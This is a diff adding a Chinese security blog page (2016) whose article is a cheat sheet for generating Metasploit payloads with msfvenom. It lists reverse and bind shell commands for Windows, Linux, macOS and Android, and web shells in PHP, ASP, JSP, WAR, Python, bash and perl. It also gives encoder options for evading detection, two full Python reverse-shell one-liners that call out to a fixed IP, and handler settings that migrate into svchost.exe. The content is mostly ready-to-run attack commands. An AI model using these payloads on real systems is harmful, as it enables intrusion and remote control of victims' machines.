@@ -1,0 +1,863 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+    
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="msfvenom生成payload, ssooking&#39;s blog">
+    <meta name="description" content="msfvenom重要参数查看payloads: msfvenom --list payloads查看支持的文件格式：msfvenom --help-formats查看payload所需参数：msfvenom -p xxx --payload">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>msfvenom生成payload | ssooking&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
+
+</head>
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="container">
+            <div class="nav-wrapper">
+                <div class="brand-logo">
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <img src="/medias/logo.png" class="logo-img hide-on-small-only">
+                        
+                        <span class="logo-span">ssooking's blog</span>
+                    </a>
+                </div>
+                <a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>Index</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>Tags</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>Categories</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>Archives</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>About</span>
+        </a>
+    </li>
+    
+    <li>
+        <a id="toggleSearch" class="waves-effect waves-light">
+            <i id="searchIcon" class="mdi-action-search"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div class="side-nav" id="mobile-nav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">ssooking's blog</div>
+        <div class="logo-desc">
+            
+            征途漫漫，步履铿锵，无畏、无惧、无阻！
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                Index
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                Tags
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                Categories
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                Archives
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                About
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/ssooking" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+
+    <div class="social-link"><a href="https://github.com/ssooking" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <i class="fa fa-github"></i>
+</a>
+<a href="mailto:ssooking@yeah.net" class="tooltipped" target="_blank" data-tooltip="mail：ssooking@yeah.net" data-position="top" data-delay="50">
+    <i class="fa fa-envelope-open"></i>
+</a>
+
+<a href="#!" class="tooltipped" data-tooltip="wechat: licg18238296977" data-position="top" data-delay="50">
+    <i class="fa fa-wechat"></i>
+</a>
+
+<a href="#!" class="tooltipped" data-tooltip="QQ: 1652010949" data-position="top" data-delay="50">
+    <i class="fa fa-qq"></i>
+</a>
+
+<a href="https://join.skype.com/invite/PWgoTe4YvrbH" class="tooltipped" target="_blank" data-tooltip="skype：ssooking" data-position="top" data-delay="50">
+    <i class="fa fa-skype"></i>
+</a>
+
+</div>
+</div>
+
+            </div>
+        </div>
+
+        
+        <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/ssooking" class="github-corner tooltipped hide-on-med-and-down" target="_blank" data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewbox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/>
+    </svg>
+</a>
+        
+    </nav>
+</header>
+
+
+
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        msfvenom生成payload
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1,
+    #articleContent h2,
+    #articleContent h3,
+    #articleContent h4,
+    #articleContent h5,
+    #articleContent h6 {
+        padding-top: 76px;
+        margin-top: -76px;
+    }
+
+    #articleContent h1 {
+        line-height: 3.5rem;
+    }
+
+    #articleContent h2 {
+        line-height: 3.2rem;
+    }
+
+    #articleContent h3 {
+        line-height: 2.8rem;
+    }
+
+    #articleContent h4 {
+        line-height: 2.5rem;
+    }
+
+    #articleContent h5 {
+        line-height: 2.2rem;
+    }
+
+    #articleContent h6 {
+        line-height: 1.9rem;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            
+            <div class="article-tag">
+                
+                <a href="/tags/metasploit/" target="_blank">
+                    <span class="chip bg-color">metasploit</span>
+                </a>
+                
+                <a href="/tags/RAT/" target="_blank">
+                    <span class="chip bg-color">RAT</span>
+                </a>
+                
+                <a href="/tags/木马后门/" target="_blank">
+                    <span class="chip bg-color">木马后门</span>
+                </a>
+                
+            </div>
+            
+            <div class="post-info">
+                
+                <span class="post-cate">
+                    <i class="fa fa-bookmark fa-fw icon-category"></i>
+                    
+                    <a href="/categories/攻防渗透/" class="post-category" target="_blank">
+                        攻防渗透
+                    </a>
+                    
+                    <a href="/categories/攻防渗透/神兵利器/" class="post-category" target="_blank">
+                        神兵利器
+                    </a>
+                    
+                </span>
+                
+
+                <span class="post-date">
+                    <i class="fa fa-clock-o fa-fw"></i>2016-11-15
+                </span>
+            </div>
+        </div>
+        <hr>
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="msfvenom重要参数"><a href="#msfvenom重要参数" class="headerlink" title="msfvenom重要参数"></a>msfvenom重要参数</h1><p>查看payloads: <code>msfvenom --list payloads</code><br>查看支持的文件格式：<code>msfvenom --help-formats</code><br>查看<code>payload</code>所需参数：<code>msfvenom -p xxx --payload-options</code></p>
+<p>编码参数</p>
+<pre class=" language-bash"><code class="language-bash">-e x86/shikata_ga_nai -i 5 -b <span class="token string">"\x00"</span> //使用shikata_ga_nai编码器编码5次并去除空字符
+</code></pre>
+<h1 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h1><pre class=" language-bash"><code class="language-bash">windows/shell_bind_tcp
+windows/meterpreter/bind_tcp
+windows/meterpreter/reverse_tcp
+windows/x64/meterpreter/reverse_tcp
+linux/x86/shell_bind_tcp
+linux/x86/meterpreter_reverse_tcp
+</code></pre>
+<h2 id="System-Payloads"><a href="#System-Payloads" class="headerlink" title="System Payloads"></a>System Payloads</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f elf <span class="token operator">></span> shell.elf
+</code></pre>
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>messagebox Test</p>
+<pre class=" language-bash"><code class="language-bash">msfvenom -a x86 -p windows/messagebox TEXT<span class="token operator">=</span><span class="token string">"hello, it is a test"</span>
+</code></pre>
+<p>windows下生成32位/64位payload时需要注意。</p>
+<pre class=" language-bash"><code class="language-bash">msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe
+</code></pre>
+<p>以<code>windows/meterpreter/reverse_tcp</code>为例，该payload默认为32位，也可使用<code>-a x86</code>选项指定。</p>
+<p>如果要生成64位，则payload为<code>windows/x64/meterpreter/reverse_tcp</code>。</p>
+<h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>nc正向连接</p>
+<pre class=" language-bash"><code class="language-bash">msfvenom -p windows/shell_hidden_bind_tcp rhost<span class="token operator">=</span>192.168.0.107 lport<span class="token operator">=</span>8956 -f exe<span class="token operator">></span> 1.exe      
+</code></pre>
+<p> nc反向连接，监听</p>
+<pre class=" language-bash"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp lhost<span class="token operator">=</span>192.168.0.107 lport<span class="token operator">=</span>888 -f exe<span class="token operator">></span> 1.exe
+</code></pre>
+<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho <span class="token operator">></span> shell.macho
+</code></pre>
+<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><pre class=" language-bash"><code class="language-bash">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.apk
+</code></pre>
+<h2 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p php/meterpreter_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.php
+<span class="token function">cat</span> shell.php <span class="token operator">|</span> pbcopy <span class="token operator">&amp;&amp;</span> <span class="token keyword">echo</span> <span class="token string">'&lt;?php '</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'\n'</span> <span class="token operator">></span> shell.php <span class="token operator">&amp;&amp;</span> pbpaste <span class="token operator">>></span> shell.php
+</code></pre>
+<h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f asp <span class="token operator">></span> shell.asp
+</code></pre>
+<h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.jsp
+</code></pre>
+<h3 id="war"><a href="#war" class="headerlink" title="war"></a>war</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f war <span class="token operator">></span> shell.war
+</code></pre>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_python LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.py
+msfvenom -a python -p python/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.py
+</code></pre>
+<p>正向shell</p>
+<pre class=" language-python"><code class="language-python">python<span class="token operator">/</span>python3 <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.176.1",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>
+
+python<span class="token operator">/</span>python3 <span class="token operator">-</span>c <span class="token string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('172.16.176.1',9999))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span>
+</code></pre>
+<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_bash LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.sh
+</code></pre>
+<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_perl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.pl
+</code></pre>
+<h1 id="MSF监听"><a href="#MSF监听" class="headerlink" title="MSF监听"></a>MSF监听</h1><pre class=" language-bash"><code class="language-bash">use exploit/multi/handler
+<span class="token keyword">set</span> PAYLOAD <span class="token operator">&lt;</span>Payload name<span class="token operator">></span>
+<span class="token keyword">set</span> RHOST <span class="token operator">&lt;</span>RHOST value<span class="token operator">></span>
+<span class="token keyword">set</span> RPORT <span class="token operator">&lt;</span>RPORT value<span class="token operator">></span>
+<span class="token keyword">set</span> LHOST <span class="token operator">&lt;</span>LHOST value<span class="token operator">></span>
+<span class="token keyword">set</span> LPORT <span class="token operator">&lt;</span>LPORT value<span class="token operator">></span>
+<span class="token keyword">set</span> ExitOnSession <span class="token boolean">false</span>
+exploit -j -z
+</code></pre>
+<p>其他设置</p>
+<p><code>AutoRunScript</code>：自动执行脚本<br>如：自动执行<code>post/windows/manage/migrate</code> 模块注入其他进程</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> AutoRunScript post/windows/manage/migrate
+</code></pre>
+<p>自动注入进程</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> prependmigrate <span class="token boolean">true</span>
+<span class="token keyword">set</span> prependmigrateProc svchost.exe
+</code></pre>
+<p>辅助配置</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> exitonsession <span class="token boolean">false</span> //可以让建立监听的端口继续保持侦听，可以接受多个session
+<span class="token keyword">set</span> stagerverifysslcert <span class="token boolean">false</span> //防止获取shell的时候出现的SSL_accept错误
+</code></pre>
+
+            </div>
+            <hr>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff;
+        background-color: #22AB38;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff;
+        background-color: #019FE8;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">您的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs">
+                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
+                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                    </ul>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('#reward .reward-link').on('click', function () {
+            $('#rewardModal').openModal();
+        });
+
+        $('#rewardModal .close').on('click', function () {
+            $('#rewardModal').closeModal();
+        });
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">转载请注明: </span>
+                    <a href="https://ssooking.github.io" class="b-link-green">ssooking's blog</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2016/11/15/msfvenom-sheng-cheng-payload/" class="b-link-green">msfvenom生成payload</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">上一篇</div>
+            <div class="card">
+                <a href="/2017/06/16/gong-ji-liu-liang-de-qing-xi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="攻击流量的清洗">
+                        
+                        <span class="card-title">攻击流量的清洗</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">前言　　流量清洗是指在全部的网络流量中区分出正常流量和恶意流量，将恶意流量阻断和丢弃，而只将正常的流量交付给服务器。与其他的网络安全检测和防护手段类似，流量清洗也需要考虑漏报率和误报率的问题。通常，漏报率和误报率是一对矛盾，需要通过对检测和</div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2017-06-16
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/安全建设/" class="post-category" target="_blank">
+                                    安全建设
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/DDOS/" target="_blank">
+                        <span class="chip bg-color">DDOS</span>
+                    </a>
+                    
+                    <a href="/tags/IDS/" target="_blank">
+                        <span class="chip bg-color">IDS</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">本篇</div>
+            <div class="card">
+                <a href="/2016/11/15/msfvenom-sheng-cheng-payload/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="msfvenom生成payload">
+                        
+                        <span class="card-title">msfvenom生成payload</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">msfvenom重要参数查看payloads: msfvenom --list payloads查看支持的文件格式：msfvenom --help-formats查看payload所需参数：msfvenom -p xxx --payload</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2016-11-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/攻防渗透/" class="post-category" target="_blank">
+                                    攻防渗透
+                                </a>
+                            
+                            <a href="/categories/攻防渗透/神兵利器/" class="post-category" target="_blank">
+                                    神兵利器
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/metasploit/" target="_blank">
+                        <span class="chip bg-color">metasploit</span>
+                    </a>
+                    
+                    <a href="/tags/RAT/" target="_blank">
+                        <span class="chip bg-color">RAT</span>
+                    </a>
+                    
+                    <a href="/tags/木马后门/" target="_blank">
+                        <span class="chip bg-color">木马后门</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title">目录</div>
+            <div id="toc-content">
+
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+       <div class="col s12 m8 l8 copy-right">
+            copyright &copy; <a href="https://ssooking.github.io/" target="_blank">ssooking</a>. 关注安全动态，分享优质文章！
+        </div>
+
+        <div class="col s12 m4 l4 social-link"><a href="https://github.com/ssooking" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <i class="fa fa-github"></i>
+</a>
+<a href="mailto:ssooking@yeah.net" class="tooltipped" target="_blank" data-tooltip="mail：ssooking@yeah.net" data-position="top" data-delay="50">
+    <i class="fa fa-envelope-open"></i>
+</a>
+
+<a href="#!" class="tooltipped" data-tooltip="wechat: licg18238296977" data-position="top" data-delay="50">
+    <i class="fa fa-wechat"></i>
+</a>
+
+<a href="#!" class="tooltipped" data-tooltip="QQ: 1652010949" data-position="top" data-delay="50">
+    <i class="fa fa-qq"></i>
+</a>
+
+<a href="https://join.skype.com/invite/PWgoTe4YvrbH" class="tooltipped" target="_blank" data-tooltip="skype：ssooking" data-position="top" data-delay="50">
+    <i class="fa fa-skype"></i>
+</a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title">搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字" class="search-input" autofocus>
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/js/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+</body>
+</html>
